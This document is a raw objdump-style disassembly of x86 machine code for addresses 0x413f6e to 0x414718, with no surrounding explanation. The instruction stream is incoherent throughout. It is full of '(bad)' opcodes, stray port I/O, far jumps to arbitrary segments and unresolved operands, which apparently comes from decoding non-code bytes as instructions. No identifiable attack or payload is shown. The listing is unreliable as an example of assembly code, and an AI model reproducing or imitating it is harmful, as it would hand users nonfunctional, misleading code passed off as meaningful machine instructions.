  413f6e:	outs   dx,BYTE PTR ds:[esi]
  413f6f:	lea    esp,[edx+esi*4-0x6bda6f33]
  413f76:	fcmovu st,st(1)
  413f78:	mov    al,0x2c
  413f7a:	jno    0x413fa0
  413f7c:	es xchg ebx,eax
  413f7e:	ss push 0x11
  413f81:	add    DWORD PTR [ebx-0x7cddd097],edi
  413f87:	fisub  DWORD PTR [ebp-0x57192c77]
  413f8d:	test   ebp,edi
  413f8f:	push   edx
  413f90:	inc    esi
  413f91:	and    DWORD PTR [edx],esp
  413f93:	xchg   edx,eax
  413f94:	sbb    ebx,edx
  413f96:	push   eax
  413f97:	add    BYTE PTR [eax-0x8d7c971],ch
  413f9d:	xchg   DWORD PTR [edi+0x493b5d26],ecx
  413fa3:	jae    0x414004
  413fa5:	in     eax,0x35
  413fa7:	xor    BYTE PTR [ebp+ebx*1-0x2f],0x88
  413fac:	sub    al,0x3d
  413fae:	out    dx,al
  413faf:	and    bh,0x7a
  413fb2:	retf   0xee09
  413fb5:	cmc    
  413fb6:	dec    esp
  413fb7:	clc    
  413fb8:	idiv   DWORD PTR [ecx]
  413fba:	test   BYTE PTR [ebp-0x44d4b4ec],dh
  413fc0:	sbb    eax,0x48c211e6
  413fc5:	(bad)  
  413fc6:	xchg   edi,eax
  413fc7:	inc    ebx
  413fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc9:	jne    0x413f9f
  413fcb:	cmp    DWORD PTR [esi],0x21
  413fce:	idiv   BYTE PTR [edi+0x42ad446c]
  413fd4:	fisttp DWORD PTR ds:0x96b3320d
  413fda:	xchg   esi,eax
  413fdb:	dec    ebx
  413fdc:	dec    esp
  413fdd:	jns    0x413f62
  413fdf:	mov    eax,0x8b17f411
  413fe4:	rol    BYTE PTR ds:0x25f6e7d4,0xf2
  413feb:	jnp    0x413ff7
  413fed:	sub    BYTE PTR [esi+0x2132cad4],dh
  413ff3:	fs push esp
  413ff5:	push   ecx
  413ff6:	ret    
  413ff7:	jecxz  0x41402b
  413ff9:	lahf   
  413ffa:	jns    0x413ffe
  413ffc:	in     eax,0xd5
  413ffe:	sbb    dh,al
  414000:	popf   
  414001:	je     0x413ffe
  414003:	mov    ds:0xcf8ff562,eax
  414008:	or     bh,ch
  41400a:	js     0x414057
  41400c:	retf   
  41400d:	xchg   DWORD PTR [ebx+eax*4-0x12],ebp
  414011:	jmp    0x413fc9
  414013:	push   ds
  414014:	xor    BYTE PTR [ecx],ch
  414016:	scas   al,BYTE PTR es:[edi]
  414017:	push   ss
  414018:	xchg   edi,eax
  414019:	cmc    
  41401a:	aas    
  41401b:	test   al,0x7
  41401d:	mov    ch,0xc8
  41401f:	icebp  
  414020:	and    esi,esi
  414022:	cmp    BYTE PTR [ecx+ebx*8],dl
  414025:	push   cs
  414026:	inc    ebx
  414027:	lods   al,BYTE PTR ds:[esi]
  414028:	dec    edi
  414029:	cmp    DWORD PTR [ecx],ecx
  41402b:	inc    edi
  41402c:	adc    BYTE PTR [edi+0x662ce311],ah
  414032:	ret    0xdf57
  414035:	aaa    
  414036:	or     DWORD PTR [edi+0x4ac2336d],esi
  41403c:	jno    0x414078
  41403e:	iret   
  41403f:	mov    esi,0xdcf3f2d5
  414044:	inc    edx
  414045:	jno    0x41402b
  414047:	std    
  414048:	cmc    
  414049:	push   ss
  41404a:	pop    esp
  41404b:	jno    0x413fcd
  41404d:	mov    DWORD PTR [edx-0x11e97e2f],ebp
  414053:	xchg   DWORD PTR [ecx-0x67],edi
  414056:	inc    ebp
  414057:	pop    ss
  414058:	pop    esp
  414059:	aas    
  41405a:	dec    ecx
  41405b:	cmp    al,BYTE PTR [ebx-0x6f]
  41405e:	add    edi,edi
  414060:	popa   
  414061:	sahf   
  414062:	std    
  414063:	cmp    BYTE PTR [esi-0x4e],dh
  414066:	jge    0x414081
  414068:	out    0x48,al
  41406a:	sbb    DWORD PTR [edi],edi
  41406c:	in     al,dx
  41406d:	jmp    0x41409b
  41406f:	push   0xffffffde
  414071:	ret    
  414072:	mov    eax,ds:0x337fdb72
  414077:	loopne 0x414031
  414079:	inc    eax
  41407a:	retf   
  41407b:	inc    eax
  41407c:	js     0x4140f4
  41407e:	std    
  41407f:	inc    esi
  414080:	js     0x4140dd
  414082:	cdq    
  414083:	mov    esi,0x396a59e5
  414088:	or     al,dl
  41408a:	sub    BYTE PTR [edx+0x72fdc228],dh
  414090:	repnz xor DWORD PTR [edi-0x7f92ae18],esi
  414097:	push   esp
  414098:	dec    edx
  414099:	ins    BYTE PTR es:[edi],dx
  41409a:	push   esi
  41409b:	out    0xec,eax
  41409d:	mov    ah,0x7d
  41409f:	aad    0xc3
  4140a1:	push   ebp
  4140a2:	push   ecx
  4140a3:	add    ecx,esp
  4140a5:	and    esi,DWORD PTR [esi+ecx*2-0x1dabc11]
  4140ac:	rcl    BYTE PTR [eax-0x34c4d36e],0x6c
  4140b3:	mov    al,ds:0xb43bf1bb
  4140b8:	test   BYTE PTR cs:0xb2fda71f,ch
  4140bf:	dec    ebp
  4140c0:	inc    esi
  4140c1:	int3   
  4140c2:	pop    ebx
  4140c3:	xor    eax,0xbcec9416
  4140c8:	lea    edx,[esi]
  4140ca:	jl     0x414091
  4140cc:	jae    0x414060
  4140ce:	rol    BYTE PTR [edi],cl
  4140d0:	fiadd  DWORD PTR [ecx+0x7f]
  4140d3:	push   esp
  4140d4:	xchg   BYTE PTR [eax],al
  4140d6:	push   edi
  4140d7:	mov    fs,WORD PTR [edx-0x1b]
  4140da:	out    dx,al
  4140db:	pop    ds
  4140dc:	dec    ebp
  4140dd:	out    dx,eax
  4140de:	inc    edi
  4140df:	jbe    0x414089
  4140e1:	jmp    0x5125:0x726d58b9
  4140e8:	shr    BYTE PTR [edi],0xa5
  4140eb:	arpl   WORD PTR [eax-0x14],dx
  4140ee:	sub    BYTE PTR [ebp-0x18],dl
  4140f1:	inc    edx
  4140f2:	inc    ecx
  4140f3:	sahf   
  4140f4:	jge    0x41413c
  4140f6:	inc    eax
  4140f7:	xor    bh,dh
  4140f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140fa:	jno    0x414179
  4140fc:	test   al,0x3f
  4140fe:	daa    
  4140ff:	in     al,0xa2
  414101:	xchg   esp,eax
  414102:	mov    edx,0xec183327
  414107:	mov    ebx,0xf3142212
  41410c:	fst    st(3)
  41410e:	adc    DWORD PTR [ebp+0x74f2ee2e],ecx
  414114:	(bad)  
  414115:	mov    ebx,0x33ed0141
  41411a:	dec    ebx
  41411b:	clc    
  41411c:	leave  
  41411d:	jmp    0x4140bc
  41411f:	lods   eax,DWORD PTR ds:[esi]
  414120:	dec    eax
  414121:	xor    DWORD PTR [eax+0x47],edi
  414124:	popf   
  414125:	xor    DWORD PTR [esi],esp
  414127:	mov    dl,0xb8
  414129:	jle    0x4140ab
  41412b:	out    0xf8,al
  41412d:	cmp    DWORD PTR ds:0x57e97c22,ecx
  414133:	xchg   edx,eax
  414134:	sub    BYTE PTR fs:[ebx+0x71651ced],dl
  41413b:	(bad)  
  41413c:	pop    es
  41413d:	xor    DWORD PTR [ecx+0x46],eax
  414140:	cmp    bl,cl
  414142:	pop    ebx
  414143:	fdivr  DWORD PTR [ecx-0x57643872]
  414149:	out    0xda,eax
  41414b:	es test eax,0x805d46ca
  414151:	mov    edx,0xacd4cc20
  414156:	xor    edx,esp
  414158:	aas    
  414159:	xlat   BYTE PTR ds:[ebx]
  41415a:	jo     0x414149
  41415c:	sahf   
  41415d:	push   ss
  41415e:	ficom  WORD PTR [edi+0x77]
  414161:	retf   0xbe29
  414164:	lds    edi,FWORD PTR [eax]
  414166:	sbb    al,0x8b
  414168:	mov    ?,edi
  41416a:	fcom   DWORD PTR [eax-0x659655a0]
  414170:	pop    ds
  414171:	fiadd  WORD PTR [edi]
  414173:	sar    bh,1
  414175:	es dec esp
  414177:	pushf  
  414178:	mov    al,ds:0x135a9f49
  41417d:	aaa    
  41417e:	mov    bl,0x74
  414180:	and    al,0xc4
  414182:	daa    
  414183:	or     al,0x8e
  414185:	cmc    
  414186:	loopne 0x414175
  414188:	add    dl,ah
  41418a:	pop    ecx
  41418b:	rcr    DWORD PTR [edx+0x1ba8a005],0x8f
  414192:	inc    eax
  414193:	sbb    BYTE PTR [ebp-0x7b],0x2
  414197:	cdq    
  414198:	repz test BYTE PTR [ecx-0x701e3c8f],ah
  41419f:	stos   DWORD PTR es:[edi],eax
  4141a0:	or     cl,BYTE PTR [ecx]
  4141a2:	test   BYTE PTR [edx-0x6e],dh
  4141a5:	test   al,0x33
  4141a7:	enter  0x4d4,0x48
  4141ab:	aas    
  4141ac:	pop    ss
  4141ad:	fldcw  WORD PTR [edx+0x78]
  4141b0:	push   es
  4141b1:	in     al,0xe8
  4141b3:	inc    ebx
  4141b4:	lock loopne 0x41414a
  4141b7:	scas   al,BYTE PTR es:[edi]
  4141b8:	retf   
  4141b9:	xchg   edi,eax
  4141ba:	retf   
  4141bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141bc:	inc    esp
  4141bd:	pop    ebp
  4141be:	sub    al,0x14
  4141c0:	in     eax,dx
  4141c1:	xchg   DWORD PTR [eax],ecx
  4141c3:	daa    
  4141c4:	or     cl,BYTE PTR [esi-0x62]
  4141c7:	inc    edx
  4141c8:	sbb    esp,DWORD PTR [ecx+0x55]
  4141cb:	scas   al,BYTE PTR es:[edi]
  4141cc:	sbb    ebp,DWORD PTR [edx]
  4141ce:	push   edi
  4141cf:	push   esi
  4141d0:	xchg   esi,eax
  4141d1:	clc    
  4141d2:	fbld   TBYTE PTR [ebp+esi*4-0x59c3089]
  4141d9:	sar    BYTE PTR [edi],0x53
  4141dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141dd:	pusha  
  4141de:	xchg   ebx,eax
  4141df:	and    BYTE PTR [edi+0x60f4052b],ch
  4141e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141e6:	frstor gs:[ebx]
  4141e9:	imul   edi,ebx,0x17c64e10
  4141ef:	adc    ch,0x83
  4141f2:	mov    edx,0xb347f46d
  4141f7:	dec    ebx
  4141f8:	test   BYTE PTR [esi-0x47c04d7b],al
  4141fe:	jmp    0x4141f1
  414200:	loopne 0x41422d
  414202:	out    0x20,eax
  414204:	sub    al,0x82
  414206:	rol    dl,1
  414208:	lahf   
  414209:	stc    
  41420a:	cs xchg edx,eax
  41420c:	push   ds
  41420d:	sahf   
  41420e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41420f:	stos   DWORD PTR es:[edi],eax
  414210:	add    BYTE PTR [edx],ah
  414212:	cdq    
  414213:	jecxz  0x414276
  414215:	sbb    cl,BYTE PTR [edi]
  414217:	jmp    0x8de1:0x98e447d3
  41421e:	add    dh,0x4e
  414221:	push   esp
  414222:	and    al,0xcd
  414224:	les    esp,FWORD PTR [ebx+0xac147f2]
  41422a:	repz xchg ebx,eax
  41422c:	or     BYTE PTR [eax-0x70],cl
  41422f:	xor    DWORD PTR [edx],0x6d
  414232:	push   ds
  414233:	and    eax,0x24f7964f
  414238:	test   BYTE PTR [esi-0x4e],al
  41423b:	sbb    ebx,DWORD PTR [edi-0x70eff1aa]
  414241:	mov    bl,0xe7
  414243:	pop    ds
  414244:	ins    BYTE PTR es:[di],dx
  414246:	es mov eax,0x25a3dc66
  41424c:	imul   ebp,esi,0xab29464a
  414252:	inc    ebp
  414253:	sbb    al,0x74
  414255:	dec    edx
  414256:	jp     0x41425f
  414258:	xor    al,0x4e
  41425a:	dec    edi
  41425b:	jnp    0x414276
  41425d:	pop    edx
  41425e:	jmp    0x5df2:0x84c21ff7
  414265:	lock mov ds:0xd26e0add,eax
  41426b:	loop   0x41420b
  41426d:	leave  
  41426e:	shl    BYTE PTR [edi],cl
  414270:	jl     0x4142d1
  414272:	(bad)  
  414273:	icebp  
  414274:	and    edi,0x6d81bc64
  41427a:	fwait
  41427b:	dec    edx
  41427c:	fisub  WORD PTR [ecx]
  41427e:	call   FWORD PTR [ebx+0x27]
  414281:	mov    WORD PTR [eax+0x53b28a36],ss
  414287:	jmp    0x4142e2
  414289:	xor    BYTE PTR ds:0x8ab83178,bh
  41428f:	fisubr WORD PTR [eax+0x70]
  414292:	cwde   
  414293:	rol    eax,0x2d
  414296:	arpl   WORD PTR [ecx],sp
  414298:	mov    esp,0x5f0d1b97
  41429d:	aam    0xe4
  41429f:	js     0x414298
  4142a1:	mov    edi,0xe67cbcec
  4142a6:	mov    cl,0x9a
  4142a8:	push   ebp
  4142a9:	mov    ebx,DWORD PTR [ebx]
  4142ab:	jecxz  0x4142f6
  4142ad:	cmovae edi,DWORD PTR [eax-0x2e26cce9]
  4142b4:	mov    edi,0xa9483c20
  4142b9:	sub    edi,esi
  4142bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142bc:	and    al,0x4e
  4142be:	dec    ebx
  4142bf:	loopne 0x414284
  4142c1:	call   0xe72c6a88
  4142c6:	(bad)  
  4142c7:	retf   0xfb41
  4142ca:	pop    esi
  4142cb:	idiv   cl
  4142cd:	lds    esp,FWORD PTR [eax+0x25]
  4142d0:	push   ebx
  4142d1:	mov    ch,0xd0
  4142d3:	push   ds
  4142d4:	test   bh,ah
  4142d6:	fiadd  WORD PTR [ecx+ebp*8+0x3ab3586a]
  4142dd:	(bad)  
  4142de:	imul   edi,DWORD PTR [eax],0xffffffc4
  4142e1:	push   cs
  4142e2:	mov    BYTE PTR [ebp-0x14f32bd],bh
  4142e8:	aam    0xcb
  4142ea:	xlat   BYTE PTR ds:[ebx]
  4142eb:	(bad)  
  4142ec:	dec    edx
  4142ed:	xor    al,0x3a
  4142ef:	add    DWORD PTR [ebp+0x24349fda],0xffffffde
  4142f6:	inc    eax
  4142f7:	mov    cl,0x4e
  4142f9:	hlt    
  4142fa:	pop    ebp
  4142fb:	mov    dl,0x74
  4142fd:	mov    ds:0x286a5d21,eax
  414302:	popf   
  414303:	push   es
  414304:	pop    eax
  414305:	push   0x9b6ce5de
  41430a:	(bad)  [ebx+0x48]
  41430d:	dec    eax
  41430e:	or     BYTE PTR [ebx+0x20cc6157],dl
  414314:	jp     0x414342
  414316:	mov    esp,0xe9b09c74
  41431b:	inc    esp
  41431c:	aam    0x44
  41431e:	and    al,BYTE PTR [edx-0x5]
  414321:	and    DWORD PTR [ebp-0x73],ebx
  414324:	lods   eax,DWORD PTR ds:[esi]
  414325:	xchg   edx,eax
  414326:	scas   al,BYTE PTR es:[edi]
  414327:	jbe    0x414317
  414329:	add    BYTE PTR [edi+0x90429db],bh
  41432f:	repz adc esi,esp
  414332:	das    
  414333:	sub    eax,0xdfb3bb23
  414338:	retf   
  414339:	aam    0xdc
  41433b:	out    0xa8,eax
  41433d:	sub    esp,DWORD PTR [esi]
  41433f:	mov    al,0x6d
  414341:	daa    
  414342:	mov    ch,BYTE PTR [edi+ecx*8-0x5a]
  414346:	es jbe 0x414317
  414349:	cli    
  41434a:	rcl    BYTE PTR [edi+0x17],1
  41434d:	dec    edi
  41434e:	fadd   QWORD PTR ds:0xfb298776
  414354:	mov    eax,0x4b511c55
  414359:	ror    edx,0xa0
  41435c:	(bad)  
  41435d:	aam    0x34
  41435f:	retf   
  414360:	int    0xb5
  414362:	jae    0x41436c
  414364:	sbb    eax,0x182a974f
  414369:	cwde   
  41436a:	mov    fs:0x51c64f52,al
  414370:	and    al,0x48
  414372:	push   DWORD PTR [edi+esi*8+0x3568f0e3]
  414379:	mov    esi,0x4e3cd5ce
  41437e:	or     eax,0x4a33b5da
  414383:	scas   al,BYTE PTR es:[edi]
  414384:	push   ecx
  414385:	cmp    BYTE PTR [ecx-0x530fd5e8],al
  41438b:	out    0xde,eax
  41438d:	or     al,0x6d
  41438f:	xchg   edi,eax
  414390:	mov    dl,0xc6
  414392:	mov    eax,ds:0xc8180499
  414397:	out    dx,al
  414398:	out    dx,al
  414399:	inc    eax
  41439a:	imul   edi,DWORD PTR [edi],0xff2fc1a2
  4143a0:	cld    
  4143a1:	add    BYTE PTR [esp+ecx*4+0x1e],ah
  4143a5:	es add al,0x66
  4143a8:	and    esp,ecx
  4143aa:	and    al,0x13
  4143ac:	jns    0x414380
  4143ae:	out    0xa5,eax
  4143b0:	xor    DWORD PTR [esi],edx
  4143b2:	xchg   ah,dl
  4143b4:	add    eax,0x9aaa4ec0
  4143b9:	jb     0x414417
  4143bb:	add    ebp,eax
  4143bd:	mov    al,0xce
  4143bf:	sub    edi,edi
  4143c1:	mov    DWORD PTR [edx+ebp*2-0x39],ebp
  4143c5:	sub    ah,ch
  4143c7:	shr    BYTE PTR [esi-0x34],1
  4143ca:	addr16 inc ebp
  4143cc:	dec    edi
  4143cd:	push   cs
  4143ce:	sbb    DWORD PTR [edi+0x5e],ebx
  4143d1:	xlat   BYTE PTR ds:[ebx]
  4143d2:	in     eax,dx
  4143d3:	stc    
  4143d4:	sub    bl,dh
  4143d6:	loop   0x4143ec
  4143d8:	test   BYTE PTR [esi],0x77
  4143db:	add    bh,bh
  4143dd:	jle    0x414397
  4143df:	sbb    BYTE PTR [edx],0xf7
  4143e2:	int3   
  4143e3:	imul   esi,DWORD PTR [esi-0x6b880cca],0x32
  4143ea:	pop    eax
  4143eb:	mov    ecx,DWORD PTR [ebx+0x2802d6a0]
  4143f1:	push   esp
  4143f2:	add    cl,ch
  4143f4:	mov    eax,ds:0x4d537ca1
  4143f9:	add    bh,cl
  4143fb:	cmp    eax,0xcf1e7d33
  414400:	repnz int 0x10
  414403:	push   eax
  414404:	xor    al,BYTE PTR [edi+0x18]
  414407:	and    edi,ecx
  414409:	nop
  41440a:	in     eax,0xeb
  41440c:	jecxz  0x414443
  41440e:	cwde   
  41440f:	aam    0xaa
  414411:	add    DWORD PTR [ebp-0x62d4a2b8],ecx
  414417:	inc    esp
  414418:	iret   
  414419:	push   ds
  41441a:	sbb    esp,DWORD PTR [esi+0x5c]
  41441d:	add    DWORD PTR [ebx-0x55],edi
  414420:	mov    ds:0x5e734070,eax
  414425:	es pop ds
  414427:	lock adc BYTE PTR [ebx+0x2043bd96],bh
  41442e:	or     al,0x23
  414430:	mov    ds:0x25a3b870,eax
  414435:	out    dx,eax
  414436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414437:	adc    ebx,esi
  414439:	(bad)  
  41443a:	div    DWORD PTR [ecx-0x68b5f46f]
  414440:	push   es
  414441:	cmp    BYTE PTR [eax],dh
  414443:	push   esp
  414444:	lahf   
  414445:	cdq    
  414446:	jb     0x4144a6
  414448:	test   DWORD PTR [ecx+0x24],edx
  41444b:	cmc    
  41444c:	inc    ecx
  41444d:	inc    ebx
  41444e:	test   eax,0x5aeee9d8
  414453:	shl    DWORD PTR [eax],cl
  414455:	push   esi
  414456:	push   ss
  414457:	shl    DWORD PTR [eax+ecx*4],1
  41445a:	data16 sti 
  41445c:	or     eax,0x65db394c
  414461:	and    ah,bl
  414463:	and    BYTE PTR [ebp+0x2b],ch
  414466:	loopne 0x4144d3
  414468:	mov    edx,0x8518ab10
  41446d:	pop    eax
  41446e:	retf   0xaae4
  414471:	dec    edi
  414472:	add    esp,edi
  414474:	mov    esi,0x4abdf52d
  414479:	and    al,0xc9
  41447b:	js     0x4144eb
  41447d:	sbb    al,0xd4
  41447f:	adc    BYTE PTR [ebp+eiz*2+0x1b],cl
  414483:	test   cl,bl
  414485:	mov    BYTE PTR [eax-0x3ad0fa97],bl
  41448b:	je     0x4144c2
  41448d:	and    eax,0xc99015c1
  414492:	push   cs
  414493:	pop    eax
  414494:	sub    BYTE PTR [ecx],cl
  414496:	enter  0x463,0x58
  41449a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41449b:	xchg   edx,eax
  41449c:	dec    eax
  41449d:	in     eax,0x57
  41449f:	mul    BYTE PTR [edx+0x9d3c574]
  4144a5:	nop
  4144a6:	or     al,0x1f
  4144a8:	aad    0xba
  4144aa:	scas   al,BYTE PTR es:[edi]
  4144ab:	in     eax,0x67
  4144ad:	stos   DWORD PTR es:[edi],eax
  4144ae:	add    al,0x93
  4144b0:	push   cs
  4144b1:	sub    eax,0x382e5dc
  4144b6:	push   cs
  4144b7:	aaa    
  4144b8:	ja     0x414532
  4144ba:	mov    ebp,0xb9199168
  4144bf:	or     BYTE PTR [edi+0x6d78fbfa],al
  4144c5:	imul   esi,DWORD PTR ds:0xd6750ee2,0xffffff9d
  4144cc:	pushf  
  4144cd:	xchg   ebp,eax
  4144ce:	or     DWORD PTR [eax+eiz*1-0x7bb207f4],esi
  4144d5:	or     ch,BYTE PTR [ebx-0x5ecf3bd7]
  4144db:	test   ch,dh
  4144dd:	sti    
  4144de:	adc    ch,ah
  4144e0:	dec    ebp
  4144e1:	les    edx,FWORD PTR [esi]
  4144e3:	push   ecx
  4144e4:	(bad)  
  4144e5:	push   esi
  4144e6:	std    
  4144e7:	loop   0x4144ec
  4144e9:	cs hlt 
  4144eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144ec:	dec    ecx
  4144ed:	mov    eax,0x6a36ed73
  4144f2:	pop    edx
  4144f3:	mov    eax,fs
  4144f5:	mov    bh,0xb4
  4144f7:	not    edi
  4144f9:	cmc    
  4144fa:	imul   edi,edx,0xffffffe9
  4144fd:	jle    0x4144c1
  4144ff:	sbb    dh,BYTE PTR [edx]
  414501:	mov    ecx,0xeb801972
  414506:	adc    al,0x51
  414508:	dec    edi
  414509:	sti    
  41450a:	(bad)  
  41450b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41450c:	mov    edx,0x3f7f688b
  414511:	jecxz  0x414585
  414513:	cmp    dh,0xf
  414516:	scas   al,BYTE PTR es:[edi]
  414517:	int3   
  414518:	loopne 0x414537
  41451a:	mov    dl,0x9f
  41451c:	loope  0x4144cc
  41451e:	ret    
  41451f:	jo     0x41457b
  414521:	in     al,dx
  414522:	mov    al,cl
  414524:	lods   al,BYTE PTR ds:[esi]
  414525:	sbb    ebx,DWORD PTR ds:0x4460a60c
  41452b:	add    edx,DWORD PTR [edx+0x1b6a73b3]
  414531:	lds    ebx,FWORD PTR [eax-0x78]
  414534:	jle    0x4145a1
  414536:	sbb    al,0xeb
  414538:	(bad)  
  41453a:	mov    eax,ss
  41453c:	dec    esp
  41453d:	and    al,0x73
  41453f:	add    DWORD PTR [edi-0x16],esp
  414542:	aam    0x99
  414544:	jnp    0x4144c9
  414546:	(bad)  [edx]
  414548:	push   eax
  414549:	outs   dx,DWORD PTR ds:[esi]
  41454a:	mov    bl,0x4b
  41454c:	arpl   WORD PTR ds:0xccf2c4a0,cx
  414552:	xor    al,0xdb
  414554:	mov    gs,WORD PTR [edx-0x2a]
  414557:	dec    ebp
  414558:	sub    bh,bh
  41455a:	push   cs
  41455b:	and    eax,0x8643aa70
  414560:	dec    edx
  414561:	(bad)  
  414562:	div    BYTE PTR [eax]
  414564:	add    BYTE PTR [ecx+0xd],0xef
  414568:	(bad)  
  414569:	int    0x8f
  41456b:	mul    DWORD PTR [eax+ecx*1+0x685ba971]
  414572:	shr    BYTE PTR [ebx],1
  414574:	adc    esi,eax
  414576:	add    esi,ebx
  414578:	mov    BYTE PTR [ebx-0x5c6a408b],bl
  41457e:	mov    ds:0xef0eff58,al
  414583:	inc    eax
  414584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414585:	sbb    esp,DWORD PTR ds:0x91e14db5
  41458b:	xchg   edx,eax
  41458c:	inc    edx
  41458d:	or     al,0x58
  41458f:	sbb    eax,0x3141407
  414594:	cld    
  414595:	push   edx
  414596:	outs   dx,DWORD PTR ds:[esi]
  414597:	or     dl,dl
  414599:	sbb    eax,0xc440ef7d
  41459e:	pop    edi
  41459f:	(bad)  
  4145a0:	mov    edx,0x56e49a43
  4145a5:	bound  edx,QWORD PTR [edi+0x1f7d546a]
  4145ab:	fs or  edi,ecx
  4145ae:	sub    eax,0x7937813
  4145b3:	call   0x27f0:0x67fc2335
  4145ba:	ret    
  4145bb:	mov    ecx,edx
  4145bd:	lds    esi,FWORD PTR [edi+0x3c]
  4145c0:	cmp    ebp,DWORD PTR [edx]
  4145c2:	jbe    0x41458d
  4145c4:	rol    BYTE PTR [edx+0x9],cl
  4145c7:	(bad)  
  4145c8:	push   edi
  4145c9:	fadd   DWORD PTR [eax]
  4145cb:	lods   eax,DWORD PTR ds:[esi]
  4145cc:	add    BYTE PTR [eax],0x36
  4145cf:	and    BYTE PTR [edx],al
  4145d1:	icebp  
  4145d2:	sub    dl,cl
  4145d4:	leave  
  4145d5:	mov    bl,0xbf
  4145d7:	lods   al,BYTE PTR ds:[esi]
  4145d8:	das    
  4145d9:	sbb    cl,0x9e
  4145dc:	mov    ?,ebx
  4145de:	mov    ecx,ebp
  4145e0:	test   eax,edi
  4145e2:	ds stc 
  4145e4:	scas   al,BYTE PTR es:[edi]
  4145e5:	sub    edi,DWORD PTR [esi+eax*8-0x74]
  4145e9:	mov    cs,eax
  4145eb:	or     DWORD PTR [esi-0x44],esi
  4145ee:	sub    BYTE PTR [ebx],0x3f
  4145f1:	outs   dx,BYTE PTR ds:[esi]
  4145f2:	pop    eax
  4145f3:	outs   dx,DWORD PTR ds:[esi]
  4145f4:	mov    eax,ds:0x4002e8f6
  4145f9:	mov    bl,BYTE PTR [eax+0x7e]
  4145fc:	clc    
  4145fd:	inc    edi
  4145fe:	lds    edx,FWORD PTR [ecx]
  414600:	jmp    DWORD PTR [edx-0x78]
  414603:	mov    ds:0xf138cdac,eax
  414608:	mov    cl,0x18
  41460a:	das    
  41460b:	mov    ah,0xd6
  41460d:	pop    edi
  41460e:	pop    esi
  41460f:	pop    ebp
  414610:	mov    cl,0x6f
  414612:	xchg   dh,ah
  414614:	mov    eax,DWORD PTR [ebx-0x1fd7eb8d]
  41461a:	xchg   BYTE PTR [eax-0x693c7671],bl
  414620:	repz in eax,dx
  414622:	popf   
  414623:	push   ebp
  414624:	(bad)  
  414625:	adc    eax,DWORD PTR [esi+ebx*2]
  414628:	addr16 jl 0x41466f
  41462b:	and    al,0xb5
  41462d:	cmp    DWORD PTR [eax+0x10a45e11],ecx
  414633:	mov    bl,cl
  414635:	retf   0x49d7
  414638:	loopne 0x414688
  41463a:	rol    BYTE PTR [ebx+0x74e016e2],1
  414640:	push   ss
  414641:	imul   ecx,edx,0xffffff9a
  414644:	sub    BYTE PTR [edi],0xd0
  414647:	mov    dh,0x2d
  414649:	hlt    
  41464a:	or     eax,0x4f24d976
  41464f:	(bad)  
  414650:	ror    BYTE PTR [esp+eax*2-0x40],cl
  414654:	ins    DWORD PTR es:[edi],dx
  414655:	inc    esp
  414656:	mov    eax,ds:0xe68d9648
  41465b:	push   0x77
  41465d:	fst    QWORD PTR [esp+ecx*4]
  414660:	cmp    DWORD PTR [eax+0x551c2b06],0xb32e0053
  41466a:	(bad)  
  41466b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41466c:	lahf   
  41466d:	fld    TBYTE PTR [edi-0x7c919e2]
  414673:	adc    al,0x6e
  414675:	push   edi
  414676:	pop    esi
  414677:	xor    al,0x11
  414679:	mov    edx,0xbb0f9db7
  41467e:	mov    ch,0x66
  414680:	test   eax,0x9805801f
  414685:	in     eax,dx
  414686:	mov    bh,0xed
  414688:	sub    al,0x81
  41468a:	xlat   BYTE PTR ds:[ebx]
  41468b:	and    al,0x38
  41468d:	mov    cl,0xfa
  41468f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414690:	shr    DWORD PTR [eax+0x67],cl
  414693:	pop    DWORD PTR [eax]
  414695:	ret    
  414696:	fst    QWORD PTR [ebx-0x3b]
  414699:	push   0x9
  41469b:	mov    cl,0xbf
  41469d:	pop    ecx
  41469e:	sub    ch,bl
  4146a0:	sbb    al,0x37
  4146a2:	add    BYTE PTR [ebx+esi*1-0x78ebf2d9],dl
  4146a9:	scas   al,BYTE PTR es:[edi]
  4146aa:	sub    ecx,esi
  4146ac:	add    BYTE PTR ds:0x8965cee9,0xb6
  4146b3:	adc    DWORD PTR [edx+0x69e0613c],0x5d
  4146ba:	add    ebp,DWORD PTR [eax+ecx*2]
  4146bd:	setno  BYTE PTR [eax+0x46]
  4146c1:	repz xor BYTE PTR [esp+edi*4],0x4f
  4146c6:	stc    
  4146c7:	push   ds
  4146c8:	sbb    ecx,ebp
  4146ca:	xchg   ebp,eax
  4146cb:	jae    0x414740
  4146cd:	stos   DWORD PTR es:[edi],eax
  4146ce:	push   esp
  4146cf:	sbb    eax,0xef48a8ad
  4146d4:	jmp    FWORD PTR [edi-0x5aa795cc]
  4146da:	cli    
  4146db:	(bad)  
  4146dc:	mov    cl,0x8f
  4146de:	and    WORD PTR ds:0xcdad2fc2,0x31
  4146e6:	xchg   ebx,eax
  4146e7:	jle    0x4146d1
  4146e9:	lock data16 fwait
  4146ec:	add    BYTE PTR [edi+esi*2],ch
  4146ef:	leave  
  4146f0:	retf   
  4146f1:	sub    bh,dh
  4146f3:	and    al,0xb7
  4146f5:	ret    
  4146f6:	out    0x36,eax
  4146f8:	test   DWORD PTR [edx],edx
  4146fa:	jne    0x414763
  4146fc:	jnp    0x4146bf
  4146fe:	dec    ebx
  4146ff:	and    ah,BYTE PTR [edi]
  414701:	sub    edi,DWORD PTR [ebx-0xde3550f]
  414707:	inc    edx
  414708:	test   DWORD PTR [eax-0x7bdcbe55],edx
  41470e:	(bad)  
  41470f:	and    BYTE PTR [ebp-0x2d],bh
  414712:	dec    ebp
  414713:	sahf   
  414714:	(bad)  
  414715:	xor    al,0x75
  414717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414718:	xchg   BYTE PTR [ebp-0x15],al
